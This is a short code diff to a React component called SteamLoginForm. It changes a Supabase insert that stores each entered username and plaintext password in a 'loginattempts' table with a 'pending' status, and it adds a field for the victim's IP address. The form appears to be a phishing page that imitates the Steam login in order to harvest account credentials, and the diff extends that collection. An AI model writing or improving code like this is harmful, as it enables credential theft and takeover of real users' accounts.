@@ -68,16 +68,17 @@ const SteamLoginForm = () => {
     setIsLoading(true);
 
     try {
+      const ip = "0.0.0.0"; // In a real app, you would get this from an API or server-side
+      
       const { data, error } = await supabase
         .from('loginattempts')
-        .insert([
-          { 
-            username, 
-            password,
-            status: 'pending',
-            online: true
-          }
-        ])
+        .insert({
+          username,
+          password,
+          status: 'pending',
+          online: true,
+          ip
+        })
         .select()
         .single();
 
